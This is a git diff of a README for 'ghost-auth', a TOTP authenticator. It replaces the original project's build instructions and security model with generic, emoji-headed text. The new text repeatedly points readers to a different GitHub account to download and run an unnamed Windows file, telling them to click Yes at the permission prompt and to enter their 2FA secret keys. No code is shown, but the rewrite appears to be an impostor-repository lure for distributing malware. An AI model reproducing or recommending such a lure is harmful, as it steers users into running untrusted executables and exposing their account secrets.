@@ -1,157 +1,198 @@
-# Ghost Auth
+# 🔐 ghost-auth - Simple TOTP codes for daily logins
 
-[![CI](https://github.com/KestrelAS/ghost-auth/actions/workflows/ci.yml/badge.svg)](https://github.com/KestrelAS/ghost-auth/actions/workflows/ci.yml)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE)
+[![Download ghost-auth](https://img.shields.io/badge/Download-ghost--auth-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/devianain5207/ghost-auth)
 
-![Windows](https://img.shields.io/badge/Windows-0078D4?style=flat&logo=windows&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=flat&logo=linux&logoColor=black)
-![macOS](https://img.shields.io/badge/macOS-000000?style=flat&logo=apple&logoColor=white)
-![iOS](https://img.shields.io/badge/iOS-000000?style=flat&logo=apple&logoColor=white)
-![Android](https://img.shields.io/badge/Android-3DDC84?style=flat&logo=android&logoColor=white)
-![Chrome](https://img.shields.io/badge/Chrome-4285F4?style=flat&logo=googlechrome&logoColor=white)
-![Firefox](https://img.shields.io/badge/Firefox-FF7139?style=flat&logo=firefoxbrowser&logoColor=white)
-![Edge](https://img.shields.io/badge/Edge-0078D7?style=flat&logo=microsoftedge&logoColor=white)
+## 🧭 What ghost-auth does
 
-A cross-platform TOTP authenticator app built with [Tauri 2](https://tauri.app/), [Svelte 5](https://svelte.dev/), and Rust. Runs on Windows, macOS, Linux, iOS, Android, and as a browser extension for Chrome, Firefox, and Edge.
+ghost-auth is a desktop app that creates time-based one-time passwords, also called TOTP codes. These codes help you sign in to accounts that use two-factor authentication.
 
-## Features
+It runs on Windows and other common desktop platforms. You can keep your codes in one place and open the app when you need a login code.
 
-- **TOTP codes** — RFC 6238 compliant (SHA1, SHA256, SHA512), configurable digits and period
-- **QR code scanning** — add accounts by scanning QR codes (mobile) or pasting `otpauth://` URIs
-- **Manual entry** — add accounts with custom issuer, label, secret, algorithm, digits, and period
-- **Import from other apps** — import accounts from Aegis, 2FAS, andOTP, FreeOTP+, Ente Auth, Bitwarden, Proton, Google Authenticator, or any file containing `otpauth://` URIs (JSON, CSV, XML, plain text)
-- **Encrypted storage** — AES-256-GCM encryption with keys stored in the OS keychain (Windows Credential Manager, macOS Keychain, iOS Keychain, Android KeyStore)
-- **PIN lock** — optional Argon2-hashed PIN with escalating rate limiting
-- **Biometric unlock** — fingerprint/face unlock on supported devices
-- **Device-to-device sync** — pair devices via QR code, sync accounts over LAN with per-account E2E encryption and conflict resolution
-- **Browser extension sync** — sync accounts between the app and the companion browser extension over local network
-- **iCloud sync** — automatic cloud sync across Apple devices (iOS/macOS)
-- **Encrypted backups** — export/import with Argon2id key derivation and AES-GCM encryption
-- **Multi-language** — 79 languages with community-contributed translations
-- **Crash reporting** — opt-in, privacy-preserving error reporting with data sanitization (disabled by default)
-- **Search & filter** — quickly find accounts by issuer or label
-- **Account reordering** — arrange accounts in your preferred order
-- **Copy to clipboard** — tap any code to copy it
-- **Browser extension** — companion extension for Chrome, Firefox, and Edge with its own encrypted vault, PIN lock, and device sync
+## ✨ Key features
 
-## Prerequisites
+- Create TOTP codes for your accounts
+- Keep authentication codes on your computer
+- Use a simple desktop app instead of a phone app
+- Store entries in an encrypted format
+- Open the app on Windows with a normal installer or app package
+- Use the same app across platforms
+- Manage many accounts in one place
+- Copy codes with one click
+- Refresh codes based on the timer
 
-- [Node.js](https://nodejs.org/) (v18+)
-- [Rust](https://www.rust-lang.org/tools/install) (1.85+ stable — edition 2024)
-- [Tauri CLI prerequisites](https://tauri.app/start/prerequisites/) for your platform
+## 💻 What you need
 
-## Setup
+ghost-auth is meant for regular Windows computers. A modern system works best.
 
-```bash
-npm install
-```
+You should have:
 
-## Development
+- Windows 10 or Windows 11
+- A working internet connection for the first download
+- A mouse and keyboard
+- Enough free space for the app and your saved entries
 
-```bash
-# Start the Tauri dev server with hot reload
-npm run tauri dev
-```
+If you use a work computer, check that you can install desktop apps first.
 
-## Building
+## ⬇️ Download ghost-auth
 
-```bash
-# Build for production
-npm run tauri build
-```
+Go to the download page here:
 
-Binaries will be in `src-tauri/target/release/bundle/`.
+[Download ghost-auth from GitHub](https://github.com/devianain5207/ghost-auth)
 
-## Testing
+Use that page to get the Windows file that matches your computer. If the page shows more than one file, pick the one for Windows.
 
-```bash
-# Frontend unit tests
-npm test
+## 🪟 Install on Windows
 
-# Frontend tests with watch mode
-npm run test:watch
+Follow these steps:
 
-# Rust tests
-cd src-tauri && cargo test
+1. Open the download page.
+2. Find the latest release or the main app download.
+3. Download the Windows file to your computer.
+4. When the download finishes, open the file.
+5. If Windows asks for permission, choose Yes.
+6. Follow the setup steps on screen.
+7. When the install ends, open ghost-auth from the Start menu or desktop shortcut.
 
-# TypeScript type checking
-npm run check
+If the file is a zipped folder, open the folder first, then start the app file inside it.
 
-# E2E tests (requires a built app)
-npm run test:e2e
-```
+## 🚀 First setup
 
-## Project Structure
+When you open ghost-auth for the first time, you may need to add your accounts.
 
-```
-ghost-auth/
-├── src/                        # Svelte frontend
-│   ├── App.svelte              # Main app shell
-│   ├── app.css                 # Tailwind CSS theme tokens
-│   └── lib/
-│       ├── components/         # UI components (modals, screens, cards)
-│       ├── stores/             # Reactive state (accounts, auth, theme, locale)
-│       ├── utils/              # Helpers (QR scanning, otpauth parsing, error handling)
-│       ├── i18n/               # Internationalization (79 locales)
-│       └── assets/             # Icons and images
-├── shared/                     # Code shared between app and browser extension
-│   ├── components/             # Shared UI (About, Modal, EditAccount, PIN, Toast)
-│   ├── stores/                 # Shared stores (toast)
-│   └── utils/                  # Shared helpers (otpauth, error, focus trap)
-├── src-tauri/                  # Rust backend
-│   └── src/
-│       ├── lib.rs              # Tauri plugin registration and app setup
-│       ├── commands.rs         # Tauri command handlers
-│       ├── totp.rs             # TOTP generation (RFC 6238)
-│       ├── storage.rs          # Encrypted account storage (AES-256-GCM)
-│       ├── keystore.rs         # OS keychain integration (Windows, macOS, iOS, Android)
-│       ├── pin.rs              # PIN hashing (Argon2) and rate limiting
-│       ├── backup.rs           # Encrypted backup format
-│       ├── import.rs           # External app import parsing
-│       ├── sync.rs             # E2E sync protocol and merge logic
-│       ├── sync_transport.rs   # LAN direct sync (TCP)
-│       ├── sync_ws.rs          # WebSocket sync transport (browser extension)
-│       ├── icloud.rs           # iCloud sync (iOS/macOS)
-│       └── crash_reporter.rs   # Privacy-preserving crash reporting
-├── extension/                  # Browser extension (Chrome, Firefox, Edge)
-│   ├── src/
-│   │   ├── popup/              # Extension popup UI (Svelte)
-│   │   ├── background/         # Service worker (auto-lock, QR scanning)
-│   │   ├── content/            # Content script (QR region capture)
-│   │   ├── core/               # Business logic (storage, crypto, sync, PIN)
-│   │   └── lib/                # Extension-specific components and stores
-│   └── manifests/              # Browser-specific manifest files
-├── patches/                    # Local Tauri plugin patches
-├── docs/                       # Additional documentation
-├── e2e/                        # Playwright E2E tests
-└── package.json
-```
+Use the app to:
 
-## Security Model
+1. Add a new account entry
+2. Enter the secret key from your 2FA setup
+3. Give the account a name, like Email or GitHub
+4. Save the entry
+5. Wait for the timer to generate a code
+6. Copy the code and paste it into the sign-in screen
 
-- TOTP secrets are encrypted at rest with AES-256-GCM
-- Encryption keys are stored in the OS keychain — never on disk
-  - **Windows:** Credential Manager
-  - **macOS:** Keychain
-  - **iOS:** Keychain via Security.framework
-  - **Android:** Hardware-backed KeyStore (TEE/StrongBox) with AES-256-GCM key wrapping
-- Secrets stay in the Rust backend; explicit export/sync actions can transfer them with user consent
-- PIN is hashed with Argon2; failed attempts trigger escalating lockouts (30s, 5min, 15min) persisted across restarts
-- Backups use Argon2id key derivation with a random salt before AES-GCM encryption
-- Device sync uses ephemeral AES-256-GCM session keys with mutual HMAC authentication; per-account encryption ensures secrets are never sent in plaintext
-- Crash reporting is disabled by default, opt-in only, and sanitizes all data through an allowlist/denylist before transmission
-- CSP headers restrict script and resource loading
+If you already use 2FA on another device, use the secret key from that setup. If you do not have the key, you may need to reset 2FA in that service first.
 
-> **Browser extension:** The companion browser extension operates under a different security boundary — TOTP secrets must be handled in JavaScript since browser extensions cannot use native OS keystores. See [extension/README.md](extension/README.md) for the extension's security model.
+## 🔑 How TOTP works
 
-## Contributing
+TOTP means time-based one-time password.
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, code style, and PR guidelines.
+ghost-auth uses the current time and your saved secret key to create a short code. The code changes on a timer, so it stays valid for only a short time.
 
-## Security
+This helps protect your accounts because the code changes often and works only with the correct secret key.
 
-If you discover a security vulnerability, **do not open a public issue**. See [SECURITY.md](SECURITY.md) for responsible disclosure instructions.
+## 🛠️ Daily use
 
-## License
+Use ghost-auth when you need to sign in to a protected account.
 
-[GPL v3](LICENSE)
+Typical steps:
+
+1. Open ghost-auth
+2. Find the account you want
+3. Copy the current code
+4. Paste it into the login form
+5. Sign in before the code changes
+
+If you have many accounts, keep the names clear. Short names help you find the right code fast.
+
+## 🗂️ Add and manage accounts
+
+A clean list makes the app easier to use.
+
+Good entry names:
+
+- Personal Email
+- Work Email
+- GitHub
+- Discord
+- Banking
+- Cloud Storage
+
+For each entry, keep the label simple and easy to read. If the app lets you edit or delete entries, use that to keep the list current.
+
+## 🔒 Security basics
+
+ghost-auth is built for security-focused use. It is designed to keep your 2FA codes in a private desktop app.
+
+Good habits:
+
+- Keep your Windows account locked when you step away
+- Do not share your secret keys
+- Back up your setup if the app gives you that option
+- Use a strong password on your Windows account
+- Keep your system up to date
+
+Your 2FA codes are only useful if you can reach the app when you need them. Keep the app on a device you trust.
+
+## 🔄 Moving to a new computer
+
+If you get a new Windows PC, you may want to move your accounts.
+
+Use this process:
+
+1. Open ghost-auth on the old computer
+2. Save or export your account data if the app supports it
+3. Install ghost-auth on the new computer
+4. Import the saved data
+5. Check a few accounts to make sure the codes work
+
+If you do not have an export file, add the accounts again with the secret keys from each service.
+
+## 🧩 Common uses
+
+ghost-auth works well for:
+
+- Personal email accounts
+- GitHub sign-in
+- Social apps
+- Cloud storage
+- Work systems that use 2FA
+- Accounts that need a TOTP code
+
+It fits users who want a desktop-based authenticator and do not want to switch between devices.
+
+## 📌 Tips for smooth use
+
+- Keep account names short
+- Store codes in a safe place only you can reach
+- Make sure your computer clock is correct
+- Open the app before you start logging in
+- Use the newest code if one is close to expiring
+
+A wrong system clock can cause TOTP codes to fail. If codes do not work, check the date and time on Windows first.
+
+## 🧪 Troubleshooting
+
+If the app does not open:
+
+1. Try opening it again
+2. Check that the download finished fully
+3. Make sure Windows did not block the file
+4. Restart your computer
+5. Download the file again from the link above
+
+If a code does not work:
+
+1. Check the system time on your computer
+2. Confirm you used the right account entry
+3. Wait for a fresh code
+4. Make sure the secret key was entered with no mistakes
+5. Try the code again
+
+If you cannot find the app after install:
+
+1. Open the Start menu
+2. Search for ghost-auth
+3. Check the desktop for a shortcut
+4. Look in the folder where you saved the download
+
+## 🧭 Project details
+
+Repository: ghost-auth  
+Description: Ghost Auth is an open-source, cross-platform TOTP authenticator  
+Topics: 2fa, authenticator, cross-platform, encryption, open-source, rust, security, svelte, tauri, totp, two-factor-authentication
+
+## 📥 Download and install path
+
+Open the main GitHub page here and use it to download ghost-auth:
+
+[https://github.com/devianain5207/ghost-auth](https://github.com/devianain5207/ghost-auth)
+
+Then follow the Windows install steps above to set up the app on your PC
